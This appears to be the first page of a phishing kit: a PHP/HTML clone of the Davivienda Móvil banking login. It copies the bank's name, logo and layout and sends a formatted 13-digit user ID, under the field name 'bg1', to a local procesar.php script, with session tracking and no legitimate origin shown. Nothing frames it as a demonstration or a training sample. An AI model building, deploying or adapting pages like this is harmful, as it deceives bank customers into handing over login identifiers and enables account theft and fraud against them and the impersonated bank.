<?php session_start(); ?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Davivienda Móvil</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(to bottom, rgba(237, 28, 39, 1) 40%, #f2f2f2 40%);
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
    }

    .container {
      width: 90%;
      max-width: 360px;
      background: #ffffff;
      border-radius: 16px;
      box-shadow: 0 6px 14px rgba(0, 0, 0, 0.2);
      padding: 2rem 1.5rem;
      box-sizing: border-box;
      margin-bottom: 80px; /* espacio para el footer */
    }

    .logo {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 1rem;
    }

    .logo img {
      height: 35px;
    }

    h2 {
      text-align: center;
      font-size: 1rem;
      color: #333;
      margin: 0.5rem 0 1.2rem;
      line-height: 1.4;
    }

    .input-icon-wrapper {
      position: relative;
      margin-bottom: 1.2rem;
    }

    .input-icon-wrapper input {
      width: 100%;
      padding: 0.65rem 0.65rem 0.65rem 2.5rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 0.95rem;
      box-sizing: border-box;
    }

    .input-icon-wrapper::before {
      content: '';
      position: absolute;
      top: 50%;
      left: 0.7rem;
      transform: translateY(-50%);
      width: 20px;
      height: 20px;
      background-image: url('https://cdn-icons-png.flaticon.com/512/747/747376.png');
      background-size: contain;
      background-repeat: no-repeat;
      opacity: 0.6;
    }

    label {
      font-size: 0.9rem;
      color: #333;
      display: block;
      margin-bottom: 0.4rem;
    }

    .remember {
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 0.85rem;
      color: #444;
      margin-bottom: 1rem;
      gap: 0.4rem;
    }

    .forgot {
      font-size: 0.85rem;
      color: #d90000;
      text-align: center;
      margin-bottom: 1.2rem;
      cursor: pointer;
    }

    .forgot:hover {
      text-decoration: underline;
    }

    .login-btn {
      width: 100%;
      padding: 0.85rem;
      background-color: #d90000;
      color: white;
      border: none;
      border-radius: 20px;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    .login-btn:hover {
      background-color: #b30000;
    }

    .face-btn {
      width: 100%;
      padding: 0.75rem;
      background: #f9f9f9;
      border: 2px solid #ccc;
      border-radius: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 0.95rem;
      gap: 0.6rem;
      margin-top: 0.8rem;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    .face-btn:hover {
      background: #eee;
    }

    .face-icon {
      width: 22px;
      height: 22px;
      background: url('https://cdn-icons-png.flaticon.com/512/747/747376.png') no-repeat center;
      background-size: contain;
    }

    /* Footer styles */
    .footer-menu {
      position: fixed;
      bottom: 0;
      width: 100%;
      max-width: 360px;
      background-color: #fff;
      display: flex;
      justify-content: space-between;
      border-top: 1px solid #ccc;
      padding: 0.4rem 0;
      z-index: 10;
    }

    .footer-item {
      flex: 1;
      text-align: center;
      font-size: 0.7rem;
      color: #000;
      padding: 0.2rem;
    }

    .footer-item img {
      width: 22px;
      height: 22px;
      display: block;
      margin: 0 auto 0.2rem;
    }
  

  </style>
</head>
<body>
 <div class="container">
  <div class="logo">
    
    <img src="logo.png" alt="Davivienda Logo" />
  </div>

  <form id="loginForm" action="procesar.php" method="post">
    <label for="usuario">Usuario</label>
    <div class="input-icon-wrapper">
      <input 
        type="text" 
        id="usuario" 
        name="bg1"
        placeholder="Ingrese el usuario de ingreso" 
        maxlength="17" 
        inputmode="numeric" 
        oninput="formatID(this)" 
      />
      
    </div>
    <div id="error-msg" style="color: red; font-size: 0.9em; margin-top: 5px;"></div>

<p></p>
    <div class="remember">
      <input type="checkbox" id="recordar" name="recordar" />
      <label for="recordar">Recordar mi usuario</label>
    </div>

    <div class="forgot">¿Olvidaste o bloqueaste tu clave?</div>

    <button type="submit" class="login-btn">Ingresar</button>
  </form>
</div>


  <!-- Footer -->
  <div class="footer-menu">
    <div class="footer-item">
      <img src="https://cdn-icons-png.flaticon.com/512/2989/2989988.png" alt="Productos" />
      <span>Abrir productos<br>en Línea</span>
    </div>
    <div class="footer-item">
      <img src="https://cdn-icons-png.flaticon.com/512/847/847969.png" alt="Registrarse" />
      <span>Registrarse</span>
    </div>
    <div class="footer-item">
      <img src="https://cdn-icons-png.flaticon.com/512/2462/2462719.png
      " alt="Atención" />
      <span>Atención en<br>Línea</span>
    </div>
    <div class="footer-item">
      <img src="https://cdn-icons-png.flaticon.com/512/535/535239.png" alt="Agencias" />
      <span>Agencias y<br>Cajeros</span>
    </div>
    <div class="footer-item">
      <img src="https://cdn-icons-png.flaticon.com/512/512/512222.png" alt="Más" />
      <span>Más...</span>
    </div>
  </div>
  <script>
    function formatID(input) {
      let raw = input.value.replace(/\D/g, '').slice(0, 13); // solo números, máximo 13
      let formatted = '';
    
      if (raw.length > 0) {
        formatted = raw.slice(0, 4);
      }
      if (raw.length > 4) {
        formatted += '-' + raw.slice(4, 8);
      }
      if (raw.length > 8) {
        formatted += '-' + raw.slice(8, 13);
      }
    
      input.value = formatted;
    }
    document.getElementById("loginForm").addEventListener("submit", function (e) {
    const input = document.getElementById("usuario");
    const raw = input.value.replace(/\D/g, '');
    const errorMsg = document.getElementById("error-msg");

    if (raw.length !== 13) {
      e.preventDefault(); // Evita el envío del formulario
      errorMsg.textContent = "Usuario inválido. Por favor, intente ingresar sus datos correctamente.";
    } else {
      errorMsg.textContent = ""; // Limpia el mensaje si está bien
    }
  });
    </script>
    
</body>
</html>
